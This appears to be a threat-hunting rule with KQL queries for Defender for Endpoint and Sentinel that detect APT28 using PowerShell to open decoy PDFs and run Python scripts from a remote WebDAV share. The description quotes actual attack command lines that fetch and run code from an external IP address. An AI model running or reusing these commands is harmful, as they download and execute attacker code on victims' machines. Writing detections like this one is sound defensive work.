# APT28 WebDav Folder File Collection

## Query Information


#### Description
Hunt for external connections initiated by PowerShell to collect files from the webdav folder. This is used to download malicious files.

Example commandlines:
```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hid -nop -c "[system.Diagnostics.Process]::Start('msedge','http://194.126.178.8/webdav/231130N581.pdf'); \\194.126.178.8@80\webdav\Python39\python.exe \\194.126.178.8@80\webdav\Python39\Client.py"
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hid -nop -c "[system.Diagnostics.Process]::Start('msedge','http://194.126.178.8/webdav/wody.pdf'); \\194.126.178.8@80\webdav\Python39\python.exe \\194.126.178.8@80\webdav\Python39\Client.py"
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hid -nop  -c "[system.Diagnostics.Process]::Start('msedge','http://194.126.178.8/webdav/StrategyUa.pdf'); \\194.126.178.8@80\webdav\Python39\python.exe 
```

#### Risk
APT28 has gotten access to one of your devices and executes malicious payloads.

#### References
- https://cert.gov.ua/article/6276894

## Defender For Endpoint
```KQL
let IPRegex = '[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}';
DeviceProcessEvents
| where tolower(ProcessCommandLine) has_all ("start", "edge", "webdav")
| extend RemoteIP = extract(IPRegex, 0, ProcessCommandLine)
| where isnotempty(RemoteIP)
| where not(ipv4_is_private(RemoteIP))
| project-reorder DeviceName, RemoteIP, ProcessCommandLine, AccountUpn
```
## Sentinel
```KQL
let IPRegex = '[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}';
DeviceProcessEvents
| where tolower(ProcessCommandLine) has_all ("start", "edge", "webdav")
| extend RemoteIP = extract(IPRegex, 0, ProcessCommandLine)
| where isnotempty(RemoteIP)
| where not(ipv4_is_private(RemoteIP))
| project-reorder DeviceName, RemoteIP, ProcessCommandLine, AccountUpn
```